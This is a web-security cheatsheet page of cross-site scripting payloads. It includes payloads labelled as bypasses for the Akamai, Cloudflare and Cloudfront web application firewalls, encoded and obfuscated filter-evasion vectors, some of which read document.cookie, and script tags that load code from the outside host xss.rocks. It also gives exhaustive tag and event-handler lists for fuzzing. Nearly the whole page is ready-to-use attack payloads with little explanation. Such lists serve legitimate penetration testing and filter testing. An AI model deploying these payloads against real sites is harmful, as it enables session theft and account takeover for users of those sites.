---
title: "XSS - Cross-site Scripting"
draft: false
images: []
description: "XSS Cheatsheet"
lead: "XSS Cheatsheet"
menu:
  docs:
    parent: "Wapp"
weight: 100
toc: true
---

## WAF Payloads Bypass

### Akamai 

```
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>

%3Cmarquee%20loop=1%20width=%271%26apos;%27onfinish=self[`al`+`ert`](1)%3E%23leet%3C/marquee%3E

%3Cx%20y=1%20z=%271%26apos;%27onclick=self[`al`%2B`ert`](1)%3E%23CLICK%20MEE
```
### Cloudflare

```
<svg onload=alert%26%230000000040"1")>

<svg onload=prompt%26%230000000040document.domain)>

<svg onload=prompt%26%23x000000028;document.domain)>

"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F

"-top['al\x65rt']('sailay')-"

asd"`> onpointerenter=x=prompt,x`XSS`

<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```
### Cloudfront

```
">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>

">'><details/open/ontoggle=confirm('XSS')>

6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/

&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
```


## Filter Evasion

### No quotes and no semicolon

```
<IMG SRC=javascript:alert('XSS')>
```

### Case Insensitive

```
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

### HTML Entity

```
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
```

### Grave Accent Obfuscation

```
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
```

### Malformed Tags

```
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>

\<a onmouseover=alert(document.cookie)\>xxs link\</a\>

<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```

### From Char Code

```
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```

### Encoded

```
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">

<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>

<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>

<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>

<IMG SRC="jav&#x09;ascript:alert('XSS');">

<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```

### No Closing Script Tags

```
<SCRIPT SRC=http://xss.rocks/xss.js?< B >

<SCRIPT SRC=//xss.rocks/.j>

<IMG SRC="('XSS')"
```

### Others
```
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">

<BODY BACKGROUND="javascript:alert('XSS')">

<IMG DYNSRC="javascript:alert('XSS')">

<IMG LOWSRC="javascript:alert('XSS')">

<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>

<svg/onload=alert('XSS')>
```

### XSS in Hidden Input Fields

XSS in hidden inputs is frequently very difficult to exploit because typical JavaScript events like onmouseover and onfocus can't be triggered due to the element being invisible.

It most certainly does on Firefox! This means we can execute an XSS payload inside a hidden attribute, provided you can persuade the victim into pressing the key combination. On Firefox Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X. You can specify a different key combination using a different key in the access key attribute. Here is the vector:
```
<input type="hidden" accesskey="X" onclick="alert(1)">
```
Now works on Chrome and link/meta and any other elements
```
<link rel="canonical" accesskey="X" onclick="alert(1)" />
```

### Character < Escape

```
<
%3C
&lt
&lt;
&LT
&LT;
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
```
### Filter Bypass Alert Obfuscation

```
(alert)(1)
a=alert,a(1)
[1].find(alert)
top[“al”+”ert”](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top[‘al\145rt’](1)
top[‘al\x65rt’](1)
top[8680439..toString(30)](1)
alert?.()
`${alert``}` (The payload should include leading and trailing backticks.)
(alert())
```

## All Posible Tags
```
a
a2
abbr
acronym
address
animate
animatemotion
animatetransform
applet
area
article
aside
audio
audio2
b
base
basefont
bdi
bdo
bgsound
big
blink
blockquote
body
br
button
canvas
caption
center
cite
code
col
colgroup
command
content
custom tags
data
datalist
dd
del
details
dfn
dialog
dir
div
dl
dt
element
em
embed
fieldset
figcaption
figure
font
footer
form
frame
frameset
h1
head
header
hgroup
hr
html
i
iframe
iframe2
image
image2
image3
img
img2
input
input2
input3
input4
ins
isindex
kbd
keygen
label
legend
li
link
listing
main
map
mark
marquee
menu
menuitem
meta
meter
multicol
nav
nextid
nobr
noembed
noframes
noscript
object
ol
optgroup
option
output
p
param
picture
plaintext
pre
progress
q
rb
rp
rt
rtc
ruby
s
samp
script
section
select
set
shadow
slot
small
source
spacer
span
strike
strong
style
sub
summary
sup
svg
table
tbody
td
template
textarea
tfoot
th
thead
time
title
tr
track
tt
u
ul
var
video
video2
wbr
xmp
```

## All Posible Events
```
onactivate
onafterprint
onafterscriptexecute
onanimationcancel
onanimationend
onanimationiteration
onanimationstart
onauxclick
onbeforeactivate
onbeforecopy
onbeforecut
onbeforedeactivate
onbeforepaste
onbeforeprint
onbeforescriptexecute
onbeforeunload
onbegin
onblur
onbounce
oncanplay
oncanplaythrough
onchange
onclick
onclose
oncontextmenu
oncopy
oncuechange
oncut
ondblclick
ondeactivate
ondrag
ondragend
ondragenter
ondragleave
ondragover
ondragstart
ondrop
ondurationchange
onend
onended
onerror
onfinish
onfocus
onfocusin
onfocusout
onfullscreenchange
onhashchange
oninput
oninvalid
onkeydown
onkeypress
onkeyup
onload
onloadeddata
onloadedmetadata
onloadend
onloadstart
onmessage
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onmozfullscreenchange
onpagehide
onpageshow
onpaste
onpause
onplay
onplaying
onpointerdown
onpointerenter
onpointerleave
onpointermove
onpointerout
onpointerover
onpointerrawupdate
onpointerup
onpopstate
onprogress
onreadystatechange
onrepeat
onreset
onresize
onscroll
onsearch
onseeked
onseeking
onselect
onselectionchange
onselectstart
onshow
onstart
onsubmit
ontimeupdate
ontoggle
ontouchend
ontouchmove
ontouchstart
ontransitioncancel
ontransitionend
ontransitionrun
ontransitionstart
onunhandledrejection
onunload
onvolumechange
onwaiting
onwebkitanimationend
onwebkitanimationiteration
onwebkitanimationstart
onwebkittransitionend
onwheel
```